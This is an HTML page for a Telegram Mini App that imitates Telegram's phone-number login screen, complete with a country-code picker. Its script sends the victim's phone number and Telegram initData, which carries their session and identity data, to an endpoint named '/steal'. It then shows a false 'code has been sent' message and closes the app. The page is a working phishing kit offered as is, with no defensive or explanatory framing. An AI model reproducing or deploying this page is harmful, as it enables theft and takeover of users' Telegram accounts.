<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            line-height: 1.4;
        }
        .page {
            padding: 20px 16px;
            max-width: 400px;
            margin: 0 auto;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo-img {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin: 0 auto 16px;
            background-size: cover;
            background-position: center;
            border: 3px solid #0088cc;
        }
        .title {
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: var(--tg-theme-hint-color, #707579);
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .label {
            font-size: 16px;
            margin-bottom: 8px;
            display: block;
            color: var(--tg-theme-text-color, #000000);
        }
        .country-selector {
            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 12px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .country-info {
            flex: 1;
            display: flex;
            align-items: center;
        }
        .country-flag {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            margin-right: 12px;
            font-size: 18px;
            text-align: center;
            line-height: 24px;
        }
        .country-name {
            font-size: 16px;
            font-weight: 500;
        }
        .country-code {
            font-size: 16px;
            color: var(--tg-theme-hint-color, #707579);
        }
        .arrow {
            color: var(--tg-theme-hint-color, #707579);
            font-size: 18px;
        }
        .phone-input {
            width: 100%;
            padding: 12px 16px;
            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
            border: none;
            border-radius: 12px;
            font-size: 16px;
            outline: none;
        }
        .checkbox {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .checkbox input {
            margin-right: 12px;
            width: 18px;
            height: 18px;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:disabled {
            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
            color: var(--tg-theme-hint-color, #999999);
            cursor: not-allowed;
        }
        .hidden {
            display: none;
        }
        .countries-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--tg-theme-bg-color, #ffffff);
            z-index: 1000;
            overflow-y: auto;
        }
        .modal-header {
            padding: 12px 16px;
            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
            font-weight: 500;
            display: flex;
            align-items: center;
        }
        .back-btn {
            margin-right: 16px;
            cursor: pointer;
            font-size: 20px;
        }
        .search-input {
            width: 100%;
            padding: 12px 16px;
            border: none;
            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
            font-size: 16px;
            outline: none;
        }
        .country-item {
            padding: 12px 16px;
            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .country-item-flag {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            margin-right: 12px;
            font-size: 18px;
            text-align: center;
            line-height: 24px;
        }
        .country-item-name {
            flex: 1;
            font-size: 16px;
        }
        .country-item-code {
            color: var(--tg-theme-hint-color, #707579);
            font-size: 16px;
        }
    </style>
</head>
<body>
    <!-- –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ -->
    <div class="page" id="mainPage">
        <div class="logo">
            <div class="logo-img" id="avatar"></div>
            <div class="title">Telegram</div>
            <div class="subtitle">Please confirm your country code and enter your phone number.</div>
        </div>

        <div class="form-group">
            <div class="label">Country</div>
            <div class="country-selector" onclick="showCountries()">
                <div class="country-info">
                    <div class="country-flag" id="currentFlag">üá∫üá¶</div>
                    <div class="country-name" id="currentCountry">Ukraine</div>
                </div>
                <div class="country-code" id="currentCode">+380</div>
                <div class="arrow">‚Ä∫</div>
            </div>
        </div>

        <div class="form-group">
            <div class="label">Your phone number</div>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="+380" oninput="validatePhone()">
        </div>

        <div class="checkbox">
            <input type="checkbox" id="keepSigned" checked>
            <label for="keepSigned">Keep me signed in</label>
        </div>

        <button class="btn" id="nextBtn" disabled onclick="sendPhone()">NEXT</button>
    </div>

    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –≤—ã–±–æ—Ä–∞ —Å—Ç—Ä–∞–Ω—ã -->
    <div id="countriesModal" class="countries-modal hidden">
        <div class="modal-header">
            <div class="back-btn" onclick="hideCountries()">‚Üê</div>
            <div>Select Country</div>
        </div>
        <input type="text" class="search-input" id="countrySearch" placeholder="Search country" oninput="filterCountries()">
        <div id="countriesList"></div>
    </div>

    <script>
        // –ó–∞–≥—Ä—É–∑–∫–∞ –∞–≤–∞—Ç–∞—Ä–∫–∏ –∏–∑ –ø–∞–ø–∫–∏ public
        document.getElementById('avatar').style.backgroundImage = "url('/avatar.jpg')";
        
        const countries = [
            {code: '+1', name: 'United States', flag: 'üá∫üá∏'},
            {code: '+7', name: 'Russia', flag: 'üá∑üá∫'},
            {code: '+380', name: 'Ukraine', flag: 'üá∫üá¶'},
            {code: '+44', name: 'United Kingdom', flag: 'üá¨üáß'},
            {code: '+49', name: 'Germany', flag: 'üá©üá™'},
            {code: '+33', name: 'France', flag: 'üá´üá∑'},
            {code: '+39', name: 'Italy', flag: 'üáÆüáπ'},
            {code: '+34', name: 'Spain', flag: 'üá™üá∏'},
            {code: '+86', name: 'China', flag: 'üá®üá≥'},
            {code: '+81', name: 'Japan', flag: 'üáØüáµ'},
            {code: '+82', name: 'South Korea', flag: 'üá∞üá∑'},
            {code: '+91', name: 'India', flag: 'üáÆüá≥'},
            {code: '+55', name: 'Brazil', flag: 'üáßüá∑'},
            {code: '+52', name: 'Mexico', flag: 'üá≤üáΩ'},
            {code: '+61', name: 'Australia', flag: 'üá¶üá∫'},
            {code: '+64', name: 'New Zealand', flag: 'üá≥üáø'},
            {code: '+31', name: 'Netherlands', flag: 'üá≥üá±'},
            {code: '+41', name: 'Switzerland', flag: 'üá®üá≠'},
            {code: '+46', name: 'Sweden', flag: 'üá∏üá™'},
            {code: '+47', name: 'Norway', flag: 'üá≥üá¥'},
            {code: '+45', name: 'Denmark', flag: 'üá©üá∞'},
            {code: '+358', name: 'Finland', flag: 'üá´üáÆ'},
            {code: '+48', name: 'Poland', flag: 'üáµüá±'},
            {code: '+420', name: 'Czech Republic', flag: 'üá®üáø'},
            {code: '+36', name: 'Hungary', flag: 'üá≠üá∫'},
            {code: '+40', name: 'Romania', flag: 'üá∑üá¥'},
            {code: '+381', name: 'Serbia', flag: 'üá∑üá∏'},
            {code: '+385', name: 'Croatia', flag: 'üá≠üá∑'},
            {code: '+30', name: 'Greece', flag: 'üá¨üá∑'},
            {code: '+90', name: 'Turkey', flag: 'üáπüá∑'},
            {code: '+20', name: 'Egypt', flag: 'üá™üá¨'},
            {code: '+27', name: 'South Africa', flag: 'üáøüá¶'},
            {code: '+234', name: 'Nigeria', flag: 'üá≥üá¨'},
            {code: '+254', name: 'Kenya', flag: 'üá∞üá™'},
            {code: '+966', name: 'Saudi Arabia', flag: 'üá∏üá¶'},
            {code: '+971', name: 'United Arab Emirates', flag: 'üá¶üá™'},
            {code: '+974', name: 'Qatar', flag: 'üá∂üá¶'},
            {code: '+65', name: 'Singapore', flag: 'üá∏üá¨'},
            {code: '+60', name: 'Malaysia', flag: 'üá≤üáæ'},
            {code: '+66', name: 'Thailand', flag: 'üáπüá≠'},
            {code: '+84', name: 'Vietnam', flag: 'üáªüá≥'},
            {code: '+62', name: 'Indonesia', flag: 'üáÆüá©'},
            {code: '+63', name: 'Philippines', flag: 'üáµüá≠'},
            {code: '+92', name: 'Pakistan', flag: 'üáµüá∞'},
            {code: '+98', name: 'Iran', flag: 'üáÆüá∑'},
            {code: '+972', name: 'Israel', flag: 'üáÆüá±'}
        ];

        let selectedCountry = countries[2]; // Ukraine –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        const currentDomain = window.location.hostname;
        const stealUrl = `https://${currentDomain}/steal`;

        function updateCurrentCountry() {
            document.getElementById('currentCountry').textContent = selectedCountry.name;
            document.getElementById('currentCode').textContent = selectedCountry.code;
            document.getElementById('currentFlag').textContent = selectedCountry.flag;
            document.getElementById('phoneInput').placeholder = selectedCountry.code;
        }

        function showCountries() {
            document.getElementById('countriesModal').classList.remove('hidden');
            renderCountries();
        }

        function hideCountries() {
            document.getElementById('countriesModal').classList.add('hidden');
        }

        function renderCountries(filter = '') {
            const list = document.getElementById('countriesList');
            list.innerHTML = '';
            
            const filtered = countries.filter(country => 
                country.name.toLowerCase().includes(filter.toLowerCase()) ||
                country.code.includes(filter)
            );
            
            filtered.forEach(country => {
                const item = document.createElement('div');
                item.className = 'country-item';
                item.innerHTML = `
                    <div class="country-item-flag">${country.flag}</div>
                    <div class="country-item-name">${country.name}</div>
                    <div class="country-item-code">${country.code}</div>
                `;
                item.onclick = () => selectCountry(country);
                list.appendChild(item);
            });
        }

        function filterCountries() {
            const search = document.getElementById('countrySearch').value;
            renderCountries(search);
        }

        function selectCountry(country) {
            selectedCountry = country;
            updateCurrentCountry();
            hideCountries();
            validatePhone();
        }

        function validatePhone() {
            const phone = document.getElementById('phoneInput').value.replace(selectedCountry.code, '').trim();
            const nextBtn = document.getElementById('nextBtn');
            nextBtn.disabled = !phone.match(/^[0-9]{7,15}$/);
        }

        function sendPhone() {
            const phone = document.getElementById('phoneInput').value;
            const tgData = Telegram.WebApp.initData;
            
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: phone,
                    tg_data: tgData,
                    stage: 'phone_entered'
                })
            }).catch(e => console.error('Error:', e));

            alert('Code has been sent to your phone. Please check Telegram.');
            Telegram.WebApp.close();
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        updateCurrentCountry();
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        Telegram.WebApp.setHeaderColor('#4a8cDc');
        Telegram.WebApp.setBackgroundColor('#ffffff');
    </script>
</body>
</html>
